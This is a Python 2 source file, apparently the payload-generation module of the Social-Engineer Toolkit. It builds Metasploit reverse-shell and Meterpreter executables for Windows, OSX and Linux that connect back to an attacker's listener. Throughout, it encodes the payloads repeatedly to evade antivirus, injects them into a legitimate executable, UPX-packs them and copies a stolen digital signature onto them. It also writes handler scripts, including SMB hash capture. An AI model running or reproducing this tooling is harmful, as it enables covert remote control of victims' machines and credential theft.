#!/usr/bin/env python
# Import modules
import subprocess
import time
import sys
import os
import re
import socket
from src.core.core import *
from src.core.menu.text import *
from src.core.dictionaries import *

listener="notdefined"

definepath=os.getcwd()
sys.path.append(definepath)
define_version = get_version()

# grab configuration options
encount="4"

configfile=file("%s/config/set_config" % (definepath),"r").readlines()

auto_migrate="OFF"

msf_path = meta_path()

for line in configfile:
        line=line.rstrip()
        match1=re.search("ENCOUNT=", line)
        if match1:
                line=line.replace("ENCOUNT=", "")
                encount=line

        match2=re.search("AUTO_MIGRATE=", line)
        if match2:
                line=line.replace("AUTO_MIGRATE=", "")
                auto_migrate=line


        match3=re.search("DIGITAL_SIGNATURE_STEAL=", line)
        if match3:
                digital_steal=line.replace("DIGITAL_SIGNATURE_STEAL=", "")

        match4=re.search("METERPRETER_MULTI_SCRIPT=", line)
        if match4:
                meterpreter_multi=line.replace("METERPRETER_MULTI_SCRIPT=", "")


        match5=re.search("METERPRETER_MULTI_COMMANDS=", line)
        if match5:
                meterpreter_multi_command=line.replace("METERPRETER_MULTI_COMMANDS=", "")
                meterpreter_multi_command=meterpreter_multi_command.replace(";", "\n")

        # define if we use upx encoding or not
        match6=re.search("UPX_ENCODE=", line)
        if match6:
                upx_encode=line.replace("UPX_ENCODE=", "")
                
        # set the upx flag
        match7=re.search("UPX_PATH=", line)
        if match7:
                upx_path=line.replace("UPX_PATH=", "")
                if upx_encode == "ON":
                        if not os.path.isfile(upx_path):
                                print "   [*] UPX packer not found in the pathname specified in config. Disabling UPX packing for executable!"
                                upx_encode == "OFF"

        # set the unc embed flag
        match8=re.search("UNC_EMBED=", line)
        if match8:
                unc_embed=line.replace("UNC_EMBED=", "")

# add the digital signature stealing
if digital_steal == "ON":
        try:
                try: reload(pefile)
                except: import pefile
                sys.path.append("src/core/digitalsig/")
                try: reload(disitool)
                except: import disitool

        except ImportError:
                print "   [-] Error! PEFile not detected. You must download it from http://code.google.com/p/pefile/"
                print "   [-] Turning the digital signature stealing flag off... A/V Detection rates may be lower."
                digital_steal = "OFF"

attack_vector=0
linosx=0
multiattack=""
# grab attack vector
if os.path.isfile("src/program_junk/attack_vector"):
        fileopen=file("src/program_junk/attack_vector", "r")
        for line in fileopen:
                line=line.rstrip()
                if line == "java":
                        attack_vector="java"
                if line == "multiattack":
                        attack_vector="multiattack"
                        multiattack=file("src/program_junk/multi_payload","w")

# here is a place holder for the multi attack java
# multiattack outputs a file called multi_java if
# this file is present it will allow additional
# functionality
multiattack_java="off"
if os.path.isfile("src/program_junk/multi_java"):
                multiattack_java="on"

# grab binary path if needed
fileopen=file("config/set_config", "r")
for line in fileopen:
        match=re.search("CUSTOM_EXE=", line)
        if match:
                line=line.rstrip()
                line=line.replace("CUSTOM_EXE=", "")
                custom_exe=line
                if custom_exe == "legit.binary": custom_exe="src/payloads/exe/legit.binary"

# custom payloadgen
payloadgen="regular"
if os.path.isfile("src/program_junk/payloadgen"):
        payloadgen="solo"

# set ipquestion to blank until otherwise pulled
ipquestion=""

####################################################################################################################################
# grab ipaddr if it hasn't been identified yet
####################################################################################################################################

if not os.path.isfile("src/program_junk/ipaddr.file"):
        filewrite=file("src/program_junk/ipaddr.file","w")
        fileopen=file("config/set_config", "r").readlines()
        for line in fileopen:
             line=line.rstrip()
             match=re.search("AUTO_DETECT=ON", line)
             if match:
                try:
                   ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                   ipaddr.connect(('google.com', 0))
                   ipaddr.settimeout(2)
                   ipaddr=ipaddr.getsockname()[0]
                   filewrite.write(ipaddr)
                   filewrite.close()
                except Exception,e:
                        log(e)
                        ipaddr=raw_input("   Enter the IP address for the payload listener: ")
                        filewrite.write(ipaddr)
                        filewrite.close()

        # if AUTO_DETECT=OFF prompt for IP Address
        for line in fileopen:
           line=line.rstrip()
           match=re.search("AUTO_DETECT=OFF", line)
           if match:
                ipaddr=raw_input("   Enter the IP address for the payload (reverse): ")
                #ipquestion=raw_input("Enter the IP address for your interface to listen for the reverse: ")
                filewrite.write(ipaddr)
                filewrite.close()

# payload selection here
try:

   # Specify path to metasploit
   path=msf_path
   # Specify payload

   #
   # here is a small trigger if we are using the core api calls to genereate
   # an executable. 
   #
   # this is encoding
   encode=""
   # this is payload
   choice1=""
   # this is port 
   choice3=""
   if os.path.isfile("src/program_junk/meterpreter_reverse_tcp_exe"):
                fileopen=file("src/program_junk/meterpreter_reverse_tcp_exe", "r")
                for line in fileopen:
                        # this reads in the first line of the file which happens to be port
                        # when calling through core
                        choice3=line.rstrip()
                        # change attack_vector to nothing
                        attack_vector=""

                # specify payload
                choice1="windows/meterpreter/reverse_tcp"
                # encode using backdoored executable
                encode="16"

   # if we don't trigger on the standard core api call
   if choice1 == "":
           show_banner(define_version,0)
           
           ###################################################
           #        USER INPUT: SHOW PAYLOAD MENU 1          #
           ###################################################   
          
           print payload_menu_1_text
           for i,option in enumerate(payload_menu_1):
               menunum = i + 1
               print('    %s. %s' % (menunum,option))    # draw menu here

   choice1 = raw_input('\n   Enter choice (hit enter for default): ')
   custom=0
   counter=0
   flag=0
   encode_stop=0

   # Condition testing of 'choice1'
   # Will use a dictionary list 
   
   if choice1 == "quit" or choice1 == "exit": 
                print "\n   [*] Exiting the Social-Engineer Toolkit.\n"
                sys.exit()

   if choice1 == '': choice1 = ("11")
   
   if choice1 == '5' or choice1 == '6' or choice1 == '7':
       encode_stop = 1
       encode = ""

   if choice1 == '8':
       flag = 1
   
   if choice1 == '11' or choice1 == '12':
       encoder = 'false'
       payloadgen = 'solo'
       filewrite = file("%s/src/program_junk/set.payload" % (definepath), "w")
       if choice1 == '11':
           filewrite.write("SETSHELL")
       else:
           filewrite.write("RATTE")
       filewrite.close()
   
   choice1 = ms_payload_2(choice1)
   
   if counter==0: courtesyshell=("")
   
   # if custom
   if choice1=='13':
        print ("   Example: /root/custom.exe\n")
        choice1=raw_input("Enter the path to your executable: ")
        if not os.path.isfile(choice1):
                print ("   File not found. Exiting.\n\n")
                sys.exit()
        custom=1
   if custom == 1:
                check_write=file("src/program_junk/custom.exe", "w")
                check_write.write("VALID")
                check_write.close()
                subprocess.Popen("cp %s msf.exe;mv msf.exe %s/src/html/msf.exe" % (choice1,definepath), shell=True).wait()

   # Specify Encoding Option
   encoder="false"
   if custom == 0:
        if encode_stop == 0 and encode != "16" and choice1 != "set/reverse_shell":
            print encoder_text
            
            ###################################################
            #        USER INPUT: SHOW ENCODER MENU            #
            ###################################################   
      
            for i,option in enumerate(encoder_menu):
                menunum = i + 1
                print('    %s. %s' % (menunum,option))    # draw menu here
            
            encode = raw_input('\n  Enter your choice (enter for default): ')

            encoder="true"

            # Handle special cases 
            if encode=='' or encode == ' ': encode = '16'
            if encode == '16': encount=0
            if encode=='14' or encode == '0': encoder="false"
                        
            # do dictionary lookup            
            encode1 = encoder_type(encode)
            encode = "x86/" + encode1

        # Specify Remote Host if ipaddr.file is missing (should never get here)
        if not os.path.isfile("src/program_junk/ipaddr.file"):
                choice2=raw_input("\n   [-] Enter IP Address of the listener/attacker (reverse) or host/victim (bind shell): ")
                filewrite=file("src/program_junk/ipaddr.file","w")
                filewrite.write(choice2)
                filewrite.close()
        fileopen=file("src/program_junk/ipaddr.file" , "r").readlines()
        for line in fileopen:
                line=line.rstrip()
                choice2=line

        # grab interface ip address
        if os.path.isfile("src/program_junk/interface"):
                fileopen=file("src/program_junk/interface", "r").readlines()
                for line in fileopen:
                        line=line.rstrip()
                        ipquestion=line
        
        # specify the port for the listener
        if choice3 == "":
                choice3=raw_input("   [-] Enter the PORT of the listener (enter for default): ")
        if choice3 == '': choice3 = '443'
        # this is needed for the set_payload
        filewrite = file ("%s/src/program_junk/port.options" % (definepath), "w")
        filewrite.write(choice3)
        filewrite.close()

        # if we are using the SET interactive shell then do this
        if choice1 == "set/reverse_shell":
                encoder = "false"
                filewrite=file("%s/src/program_junk/set.payload.posix" % (definepath), "w")
                filewrite.write("true")
                filewrite.close()
                import src.core.payloadprep

        # if were using the multiattack option
        if attack_vector == "multiattack":
                multiattack.write("MAIN="+str(choice3)+"\n")
                multiattack.write("MAINPAYLOAD="+str(choice1)+"\n")

        # if encoding is required, it will place 1msf.exe first then encode it to msf.exe
        if encoder == "true":
                choice4=("R")
                msf_filename=("1msf.exe")
        if encoder == "false":
                choice4=("X")
                msf_filename=("msf.exe")

        # set choice to blank for ALL PORTS scan
        if flag == 0:
                portnum="LPORT="+choice3
        if flag == 1:
                portnum=""
        if encode != "BACKDOOR":
                generatepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s > %s/src/html/%s" % (path,choice1,choice2,portnum,courtesyshell,choice4,definepath,msf_filename), shell=True).wait()    
        if encoder ==  "true":
                # If not option 15 or default then go here
                if encode != "MULTIENCODE":
                        if encode != "BACKDOOR":
                                print "\n   [-] Encoding the payload %s times to get around pesky Anti-Virus. [-]\n" % (str(encount))
                                encodepayload=subprocess.Popen(r"ruby %s/msfencode < %s/src/html/1msf.exe -e %s -o %s/src/html/msf.exe -t exe -c %s" % (path,definepath,encode,definepath,encount), shell=True).wait()
 
                # If option 15 or default then go here
                if encode == "MULTIENCODE":
                        print "\n   [-] Encoding the payload multiple times to get around pesky Anti-Virus. [-]\n"
                        encodepayload=subprocess.Popen(r"ruby %s/msfencode -e x86/shikata_ga_nai -i %s/src/html/1msf.exe -t raw -c 5 | ruby %s/msfencode -t raw -e x86/alpha_upper -c 2 | ruby %s/msfencode -t raw -e x86/shikata_ga_nai -c 5 | ruby %s/msfencode -t exe -c 5 -e x86/countdown -o %s/src/html/msf.exe" % (path,definepath,path,path,path,definepath), shell=True).wait()
                        encode1=("x86/countdown")
                        
                # If option 15, backdoor executable better AV avoidance
                if encode == "BACKDOOR":
                        print "\n   [-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds..."
                        subprocess.Popen("cp %s src/program_junk/legit.exe 1> /dev/null 2> /dev/null" % (custom_exe), shell=True).wait()
                        encodepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s | ruby %s/msfencode  -c 10 -e x86/shikata_ga_nai -x src/program_junk/legit.exe -o %s/src/html/msf.exe -t exe 1> /dev/null 2>/dev/null" % (path,choice1,choice2,portnum,courtesyshell,choice4,path,definepath), shell=True).wait()
                        print "   [-] Backdoor completed successfully. Payload is now hidden within a legit executable."

                        # define to use UPX or not
                        if upx_encode == "ON":
                                if choice1 != "set/reverse_shell":
                                        print "   [*] UPX Encoding is set to ON, attempting to pack the executable with UPX encoding."
                                        upx("src/html/msf.exe")
                                
                        # define to use digital signature stealing or not
                        if digital_steal == "ON":
                                print "   [*] Digital Signature Stealing is ON, hijacking a legit digital certificate.\n" 
                                disitool.CopyDigitalSignature("src/core/digitalsig/digital.signature", "src/html/msf.exe", "src/program_junk/msf2.exe")
                                subprocess.Popen("cp src/program_junk/msf2.exe src/html/msf.exe 1> /dev/null 2> /dev/null", shell=True).wait()
                        encode1=("x86/shikata_ga_nai")

        if choice1 == 'windows/shell_bind_tcp' or choice1 == 'windows/x64/shell_bind_tcp' : print "   When the payload is downloaded, you will want to connect to the victim directly."

        # specify attack vector as SET interactive shell
        if choice1 == "set/reverse_shell": attack_vector = "set_payload"

        # if we have the java attack, multiattack java, and the set interactive shell
        if attack_vector == "java" or multiattack_java == "on":
                linosx=raw_input("""   ********************************************************
   Do you want to create a Linux/OSX reverse_tcp payload
   in the Java Applet attack as well?
   ********************************************************

   Enter choice yes or no: """)
                if linosx == 'yes' or linosx == 'y':
                        if attack_vector != "set_payload":                
                                port1=raw_input("   Enter the port to listen for on OSX (enter for default): ")
                                port2=raw_input("   Enter the port to listen for on Linux (enter for default): ")
                                if port1 == "": port1="8080"
                                if port2 == "": port2="8081"
                                subprocess.Popen(r"ruby %s/msfpayload osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s X > %s/src/html/mac.bin;chmod 755 %s/src/html/mac.bin" % (path,choice2,port1,definepath,definepath), shell=True).wait()
                                subprocess.Popen(r"ruby %s/msfpayload linux/x86/shell/reverse_tcp LHOST=%s LPORT=%s X > %s/src/html/nix.bin" % (path,choice2,port2,definepath), shell=True).wait()
                                if multiattack_java == "on":
                                        multiattack.write("OSX="+str(port1)+"\n")
                                        multiattack.write("OSXPAYLOAD=osx/x86/shell_reverse_tcp\n")
                                        multiattack.write("LINUX="+str(port2)+"\n")
                                        multiattack.write("LINUXPAYLOAD=linux/x86/shell/reverse_tcp\n")

        # try block here
        try:
                 # if they want a listener, start here
                filewrite=file("src/program_junk/meta_config", "w")

                # if there isn't a multiattack metasploit, setup handler
                if not os.path.isfile("src/program_junk/multi_meta"):

                        filewrite.write("use exploit/multi/handler\n")
                        filewrite.write("set PAYLOAD "+choice1+"\n")
                        filewrite.write("set LHOST 0.0.0.0" +"\n")
                        if flag == 0:
                                filewrite.write("set LPORT "+choice3+"\n")

                        filewrite.write("set ExitOnSession false\n")
                        if auto_migrate == "ON":
                                filewrite.write("set AutoRunScript migrate -f\n")

                        # config option for using multiscript meterpreter
                        if meterpreter_multi == "ON":
                                multiwrite=file("src/program_junk/multi_meter.file", "w")
                                multiwrite.write(meterpreter_multi_command)        
                                filewrite.write("set InitialAutorunScript multiscript -rc %s/src/program_junk/multi_meter.file\n" % (definepath))
                                multiwrite.close()
                        filewrite.write("exploit -j\n\n")

                        # if we want to embed UNC paths for hashes
                        if unc_embed == "ON":
                                filewrite.write("use server/capture/smb\n")
                                filewrite.write("exploit -j\n\n")        

                        # if only doing payloadgen then close the stuff up
                        if payloadgen == "solo": filewrite.close()
                # Define linux and OSX payloads
                if payloadgen == "regular":
                        if linosx == 'y' or linosx == 'yes':
                                filewrite.write("use exploit/multi/handler\n")
                                filewrite.write("set PAYLOAD osx/x86/shell_reverse_tcp" +"\n")
                                filewrite.write("set LHOST "+choice2+"\n")
                                filewrite.write("set LPORT "+port1+"\n")
                                filewrite.write("set ExitOnSession false\n")
                                filewrite.write("exploit -j\n\n")
                                filewrite.write("use exploit/multi/handler\n")
                                filewrite.write("set PAYLOAD linux/x86/shell/reverse_tcp"+"\n")
                                filewrite.write("set LHOST "+choice2+"\n")
                                filewrite.write("set LPORT "+port2+"\n")
                                filewrite.write("set ExitOnSession false\n")
                                filewrite.write("exploit -j\n\n")                
                        filewrite.close()


        except Exception, e:
                log(e)
                print "   Something went wrong...printing error: "+ str(e)


# Catch all errors
except KeyboardInterrupt: 
        print "\n\n   Keyboard Interrupt Detected, exiting Payload Gen.\n"

# finish closing up the remenant files
if attack_vector == "multiattack":
        multiattack.close()
if os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
        filewrite=file("%s/src/program_junk/payload.options" % (definepath), "w")
        filewrite.write(choice1+" 0.0.0.0 "+choice3)
        filewrite.close()

if choice1 == "set/reverse_shell": subprocess.Popen("rm %s/src/program_junk/meta_config" % (definepath), shell=True).wait()
